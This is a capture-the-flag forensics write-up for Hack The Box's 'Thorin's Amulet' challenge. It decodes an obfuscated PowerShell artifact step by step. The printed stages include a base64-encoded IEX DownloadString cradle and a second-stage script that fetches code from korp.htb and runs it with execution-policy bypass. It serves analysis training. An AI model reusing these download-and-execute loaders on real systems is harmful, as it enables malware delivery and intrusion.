![img](assets/banner.png)

<img src='assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>Thorin’s Amulet</font>

20<sup>th</sup> January 2025

Prepared By: Nauten

Challenge Author(s): Nauten

Difficulty: <font color='green'>Very Easy</font>

<br><br>

# Synopsis

- Thorin’s Amulet is a very easy forensics challenge that involves analyzing obfuscated PowerShell code extracting relevant data to obtain the flag.

## Description

- Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end  Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened?
  Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

## Skills Required

- Familiarity with analyzing Powershell code
- Familiarity with basic encoding operations

## Skills Learned

- Analyzing Powershell code extracting relevant data
- Persistence techniques

# Enumeration

The following file is provided:

- `artifact.ps1`: contains some Powershell code

```powershell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```

Looking at the code, it is possible to see that a function **qt4PO** is declared and then called.

# Solution

Focusing on the powershell command, **EncodedCommand** parameter in Powershell expects a base64 string.

By using CyberChef and applying "From Base64":

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

It seems to be an apparently legit remote endpoint.

After spawning the docker instance, getting IP address (and port) it's possible to map it to the found hostname:

```bash
$ echo "<DOCKER_IP> korp.htb" >> /etc/hosts
```

And then making an HTTP request to it:

```bash
$ DOCKER_PORT=5000 && curl http://korp.htb:$DOCKER_PORT/update
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

Looking at the code, it is possible to see that a function **aqFVaq** is declared and then called.

Another important part to focus on is this one:

```powershell
Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
powershell.exe -exec Bypass -File "a541a.ps1"
```

Basically a call to a suspicious endpoint is made using a custom HTTP header named **X-ST4G3R-KEY** retrieving another powershell script that gets executed.

Reproduce the same HTTP request using curl to get the file content:

```bash
$ curl -H "X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d" http://korp.htb:$DOCKER_PORT/a541a
$a35 = "..snip.."
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```

By using CyberChef and applying "From HEX" operation the flag can be obtained.
